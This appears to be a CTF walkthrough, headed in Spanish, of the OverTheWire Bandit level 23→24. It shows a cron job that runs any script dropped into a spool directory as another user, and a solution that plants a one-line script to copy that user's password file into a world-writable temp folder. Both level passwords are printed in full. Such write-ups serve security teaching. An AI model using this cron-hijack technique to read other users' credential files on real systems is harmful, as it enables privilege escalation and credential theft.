## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso al nivel

* Username = bandit23
* password = 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
## Solucion
````bash

bandit23@bandit:~$ whoami
bandit23
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
bandit23@bandit:~$ mktemp -d
/tmp/tmp.V82SyE2SsV
bandit23@bandit:~$ chmod 777 /tmp/tmp.V82SyE2SsV
bandit23@bandit:~$ cd /tmp/tmp.V82SyE2SsV
bandit23@bandit:/tmp/tmp.V82SyE2SsV$ echo "cat etc/bandit_pass/bandit24 > /tmp/tmp.V82SyE2SsV/password" > script.sh
bandit23@bandit:/tmp/tmp.V82SyE2SsV$ cat script.sh
cat etc/bandit_pass/bandit24 > /tmp/tmp.V82SyE2SsV/password
bandit23@bandit:/tmp/tmp.V82SyE2SsV$ touch password
bandit23@bandit:/tmp/tmp.V82SyE2SsV$ chmod 777 password
bandit23@bandit:/tmp/tmp.V82SyE2SsV$ chmod 777 script.sh
bandit23@bandit:/tmp/tmp.V82SyE2SsV$ mv script.sh  script1.sh
bandit23@bandit:/tmp/tmp.V82SyE2SsV$ cp script1.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.V82SyE2SsV$ cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
````
## Notas adicionales
mktemp -d - para crear un directorio temporal único y seguro. El nombre del directorio es generado de manera que sea improbable que entre en conflicto con otros nombres de directorios existentes, lo cual es útil para evitar colisiones y problemas relacionados con la simultaneidad en scripts y aplicaciones.
## Referencias